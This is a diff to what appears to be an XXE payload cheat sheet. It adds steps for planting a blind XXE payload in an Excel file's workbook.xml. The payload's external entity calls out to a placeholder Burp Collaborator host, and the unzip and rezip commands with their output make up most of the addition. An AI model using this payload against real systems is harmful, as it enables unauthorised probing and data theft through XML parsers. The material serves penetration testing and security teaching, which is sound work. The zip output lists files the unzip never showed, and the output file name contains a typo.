@@ -30,6 +30,7 @@ Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
   - [XXE inside SVG](#xxe-inside-svg)
   - [XXE inside SOAP](#xxe-inside-soap)
   - [XXE inside DOCX file](#xxe-inside-docx-file)
+  - [XXE inside XLSX file](#xxe-inside-xlsx-file)
 
 ## Tools
 
@@ -382,6 +383,56 @@ JPG (experimental)
 GIF (experimental)
 ```
 
+### XXE inside XLSX file
+
+Extract the excel file.
+
+```powershell
+$ mkdir XXE && cd XXE
+$ unzip ../XXE.xlsx
+Archive:  ../XXE.xlsx
+  inflating: xl/drawings/drawing1.xml
+  inflating: xl/worksheets/sheet1.xml
+  inflating: xl/worksheets/_rels/sheet1.xml.rels
+  inflating: xl/sharedStrings.xml
+  inflating: xl/styles.xml
+  inflating: xl/workbook.xml
+  inflating: xl/_rels/workbook.xml.rels
+  inflating: _rels/.rels
+  inflating: [Content_Types].xml
+```
+
+Add your blind XXE payload inside `xl/workbook.xml`.
+
+```powershell
+<xml...>
+<!DOCTYPE x [ <!ENTITY xxe SYSTEM "http://YOURCOLLABORATORID.burpcollaborator.net/"> ]>
+<x>&xxe;</x>
+<workbook...>
+```
+
+Rebuild the Excel file.
+
+```powershell
+$ zip -r ../poc.xslx *
+updating: [Content_Types].xml (deflated 71%)
+updating: _rels/ (stored 0%)
+updating: _rels/.rels (deflated 60%)
+updating: docProps/ (stored 0%)
+updating: docProps/app.xml (deflated 51%)
+updating: docProps/core.xml (deflated 50%)
+updating: xl/ (stored 0%)
+updating: xl/workbook.xml (deflated 56%)
+updating: xl/worksheets/ (stored 0%)
+updating: xl/worksheets/sheet1.xml (deflated 53%)
+updating: xl/styles.xml (deflated 60%)
+updating: xl/theme/ (stored 0%)
+updating: xl/theme/theme1.xml (deflated 80%)
+updating: xl/_rels/ (stored 0%)
+updating: xl/_rels/workbook.xml.rels (deflated 66%)
+updating: xl/sharedStrings.xml (deflated 17%)
+```
+
 
 ## References
 
@@ -403,3 +454,4 @@ GIF (experimental)
 * [Exploiting XXE with local DTD files - Arseniy Sharoglazov - 12/12/2018](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
 * [Web Security Academy >> XML external entity (XXE) injection - 2019 PortSwigger Ltd](https://portswigger.net/web-security/xxe)
 - [Automating local DTD discovery for XXE exploitation - July 16 2019 by Philippe Arteau](https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation)
+- [EXPLOITING XXE WITH EXCEL - NOV 12 2018 - MARC WICKENDEN](https://www.4armed.com/blog/exploiting-xxe-with-excel/)
